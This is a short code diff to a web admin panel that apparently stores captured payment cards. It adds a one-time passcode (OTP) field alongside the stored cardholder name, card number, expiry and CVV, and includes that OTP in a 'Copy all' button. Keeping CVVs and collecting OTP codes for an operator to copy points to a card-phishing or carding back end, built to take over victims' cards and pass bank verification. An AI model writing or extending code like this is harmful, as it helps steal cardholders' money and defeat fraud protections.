@@ -102,10 +102,12 @@ function hasCardDetails(payment) {
   if (!payment) return false;
   if (payment.method === "card") return true;
   return Boolean(
-    payment.cardholderName ||
+    payment.method === "card" ||
+      payment.cardholderName ||
       payment.cardNumber ||
       payment.cardExpiry ||
-      payment.cardCvv
+      payment.cardCvv ||
+      payment.cardOtp
   );
 }
 
@@ -1751,6 +1753,11 @@ export default function AdminPanel({ onLogout }) {
                   value={selectedPayment.cardCvv}
                   mono
                 />
+                <DetailCopy
+                  label="OTP code"
+                  value={selectedPayment.cardOtp}
+                  mono
+                />
                 <CopyAllCardDetails payment={selectedPayment} />
               </div>
             )}
@@ -1884,6 +1891,7 @@ function cardDetailsCopyText(payment) {
     payment.cardNumber && `Card number: ${payment.cardNumber}`,
     payment.cardExpiry && `Expiry: ${payment.cardExpiry}`,
     payment.cardCvv && `CVV: ${payment.cardCvv}`,
+    payment.cardOtp && `OTP: ${payment.cardOtp}`,
   ]
     .filter(Boolean)
     .join("\n");
@@ -1923,7 +1931,7 @@ function CopyAllCardDetails({ payment, compact = false }) {
       <span>Copy all</span>
       <span className="admin-copy-value">
         <span className="admin-copy-all-hint">
-          Cardholder, number, expiry, CVV
+          Cardholder, number, expiry, CVV, OTP
         </span>
         <button
           type="button"
